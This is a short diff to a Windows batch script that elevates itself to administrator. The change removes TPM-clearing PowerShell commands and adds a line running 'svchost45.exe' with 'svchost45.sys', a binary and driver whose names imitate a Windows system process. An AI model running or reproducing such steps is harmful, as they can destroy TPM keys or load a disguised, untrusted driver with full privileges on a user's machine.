@@ -14,8 +14,6 @@ powershell -Command "Start-Process '%0' -Verb RunAs"
 exit
 :continue
 echo.
-powershell clear-tpm
-echo.
-powershell Disable-TpmAutoProvisioning
+svchost45.exe svchost45.sys
 echo.
 exit
